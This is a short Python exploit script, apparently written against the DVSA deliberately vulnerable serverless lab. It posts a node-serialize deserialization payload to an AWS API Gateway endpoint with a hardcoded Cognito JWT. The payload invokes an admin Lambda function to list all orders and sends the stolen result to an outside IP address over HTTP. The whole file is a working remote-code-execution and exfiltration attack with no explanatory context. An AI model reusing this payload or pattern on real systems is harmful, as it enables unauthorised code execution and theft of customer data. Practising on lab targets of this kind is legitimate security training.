import requests
#Returns All orders
JWT = "eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiLCJldmVudF9pZCI6Ijk3NGIwNWY3LWM3N2ItNGM0Ny04NDhjLThkMTNlYTAyM2ExZSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODk0OTYyODYsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTY1MzY5MSwiaWF0IjoxNTg5NjUwMDkxLCJqdGkiOiJkZDQwYWMzYy0xMDM3LTRlMDEtOTgwNS03NjliMThhNDlhNGQiLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIn0.VQfd3hFY48VUG65o0RHf5tOlP-5nbnSHRPQgUDnQD2_IoNwOR-wRf5xk3aGGS9-eSkLP1Tt5e_j_WHOF58036rXPpASt5E_SGSAsWrzAX-e9-LhI_oR09LGL1XBLJ0UuTkr_bfDZlUzi6LDm7IIIsabdxXDZmZu-yUU_nc2pKF8Feuc9jdiMFl3G6SvmOum4WDVO8uyBDJyCzbpQgs_VZ-58x2iIScCnzX3ruQnWgrFmhmmtYYKlvmr2rdZU0rPdZG3-K4rt6W4EN2rAM6nRobqXU7j1Q-GzyMqe68GT_skrWLxeIhVsGM6Aj9bq3MVhrdBOdUrhbTMgDY9pyhhAtQ"
ENDPOINT = 'https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com'

remoteServer = "http://92.222.72.208/"

payload = (
   '_$$ND_FUNC$$_function(){'
       'var aws=require("aws-sdk");'
       'var lambda=new aws.Lambda();'
       'var p = {'
           'FunctionName: "DVSA-ADMIN-GET-ORDERS",'
           'InvocationType: "RequestResponse"' 
           '};'
        'lambda.invoke(p,function(e,d){' 
            'var h=require("http");'
            'h.get("http://92.222.72.208"+JSON.stringify(d));'
            '});' 
        '}()'
)

requests.post(f"{ENDPOINT}/dev/order", headers={
    'Accept': 'application/json',
    'Authorization': JWT
}, json={'action': payload})
